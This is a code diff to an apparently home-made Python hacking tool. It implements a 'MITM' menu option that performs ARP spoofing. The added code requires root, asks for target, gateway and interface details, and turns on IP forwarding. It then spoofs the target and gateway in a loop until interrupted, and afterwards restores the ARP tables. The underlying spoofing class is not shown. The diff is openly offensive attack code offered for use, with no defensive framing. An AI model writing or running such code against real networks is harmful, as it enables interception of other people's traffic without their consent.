@@ -1,4 +1,4 @@
-import func, colorama, time
+import func, colorama, time, os
 from cryptography.fernet import Fernet
 import scapy
 
@@ -330,7 +330,34 @@ MITM                            (to do an Arp-Spoofing attack)
                 func.os.system(CMD)
 
         elif CMD == "MITM":
-            pass
+            if os.geteuid() != 0:
+                print("You didn't start the program as an admin. Now you can't do this :(")
+                continue
+            
+            MITM = func.net.MITM(
+                target_ip=func.generall.ask("Target IP: ", colorama.Fore.GREEN),
+                gateway_ip=func.generall.ask("gateway IP: ", colorama.Fore.GREEN),
+                my_ip=func.generall.ask("Your IP: ", colorama.Fore.GREEN),
+                interface=func.generall.ask("Network-Interface: ", colorama.Fore.GREEN)
+            )
+            
+            MITM.change_ip_forwarding(True)
+            try:
+                while True:
+                    print("doing it's stuff (stop = Ctrl+C)")
+                    MITM.spoof("target")
+                    MITM.spoof("gateway")
+            except KeyboardInterrupt:
+                print("KeyboardInterrupt")
+            except Exception as e:
+                print("Exception: ", e)
+            finally:
+                print("Now clearing")
+                for _ in range(15):
+                    print(f"Step {_+1}/15")
+                    MITM.restore("target")
+                    MITM.restore("gateway")
+                MITM.change_ip_forwarding(False)
 
         else:
             print("This wasn't an Option!")
